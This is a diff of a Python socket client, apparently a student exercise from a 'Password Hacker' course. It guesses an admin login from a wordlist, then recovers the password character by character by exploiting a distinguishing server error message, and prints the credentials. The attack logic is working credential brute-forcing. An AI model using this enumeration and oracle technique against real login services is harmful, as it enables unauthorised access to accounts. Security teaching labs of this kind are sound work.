@@ -1,21 +1,22 @@
 # write your code here
 import argparse
 import itertools
+import json
 import socket
+import string
 
 
-def test_password(sock, password):
-    sock.send(password.encode())
+def test_credentials(sock, login, password):
+    credentials = {"login": login, "password": password}
+    sock.send(json.dumps(credentials).encode())
     response = sock.recv(1024)
-    reply = response.decode()
+    return json.loads(response.decode())
 
-    if reply == "Connection success!":
-        print(password)
-        return 1
-    elif reply == "Too many attempts to connect!":
-        return -1
-    else:
-        return 0
+
+def read_dictionary(filename):
+    with open(filename, 'r') as infile:
+        for line in infile:
+            yield line.rstrip('\n')
 
 
 def main(args):
@@ -23,22 +24,38 @@ def main(args):
         address = (args.host, args.port)
         testsock.connect(address)
 
-        with open(args.dict, 'r') as dictionary:
-            for line in dictionary:
-                testword = line.rstrip('\n')
-                if testword == testword.upper():
-                    if test_password(testsock, testword) != 0:
+        adminlogin = ""
+        testlogins = read_dictionary(args.admin)
+        for testlogin in testlogins:
+            reply = test_credentials(testsock, testlogin, " ")
+            if reply['result'] == "Wrong password!":
+                adminlogin = testlogin
+                break
+
+        adminpass = ""
+        if adminlogin != "":
+            characters = [c for c in string.ascii_letters] + [str(n) for n in range(10)]
+            password = ""
+            success = False
+            while not success:
+                for char in characters:
+                    reply = test_credentials(testsock, adminlogin, password + char)
+                    if reply['result'] == "Connection success!":
+                        adminpass = password + char
+                        success = True
                         break
-                else:
-                    testwords = map(''.join, itertools.product(*zip(testword, testword.upper())))
-                    for testword in testwords:
-                        if test_password(testsock, testword) != 0:
-                            return
+                    elif reply['result'] == "Exception happened during login":
+                        password += char
+                        break
+
+        creds = {"login": adminlogin, "password": adminpass}
+        print(json.dumps(creds))
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('host', help="server hostname")
     parser.add_argument('port', help="server port number", type=int)
-    parser.add_argument('--dict', help="dictionary of typical passwords", default="passwords.txt")
+    parser.add_argument('-a', '--admin', help="dictionary of typical admin logins", default="/Users/professional/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt")
+    parser.add_argument('-p', '--paswd', help="dictionary of typical passwords", default="passwords.txt")
     main(parser.parse_args())
